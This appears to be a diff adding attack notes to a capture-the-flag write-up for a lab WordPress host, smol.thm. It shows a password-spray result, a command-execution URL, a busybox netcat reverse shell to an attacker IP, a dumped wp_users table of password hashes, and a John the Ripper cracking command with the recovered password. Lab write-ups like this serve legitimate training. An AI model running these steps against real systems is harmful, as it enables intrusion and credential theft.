@@ -302,8 +302,45 @@ ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash
 [+] Performing password attack on Xmlrpc against 6 user/s
 [SUCCESS] - wpuser / kbLSF2Vop#lw3rjDZ629*Z%G              
 
-get access
+**get access to**
 http://www.smol.thm/wp-admin/tools.php
+
+**RCE**
+http://www.smol.thm/wp-admin/index.php?cmd=id
+
+**GET reverse shell**
+
+http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%2010.10.37.21%204444%20-e%20bash
+
+**run mysql**
+
+mysql> use wordpress;
+
+show tables;use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+mysql> select * from wp_users;
+select * from wp_users;
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
+|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
+|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
+|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
+|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
+|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+
+**Cracking the Password Hashes**
+Using John the Ripper
+
+john --wordlist=/usr/share/wordlists/rockyou.txt wordpress_hashes.txt
+
+user: diego
+Password: sandiegocalifornia
 
 <\code>
 
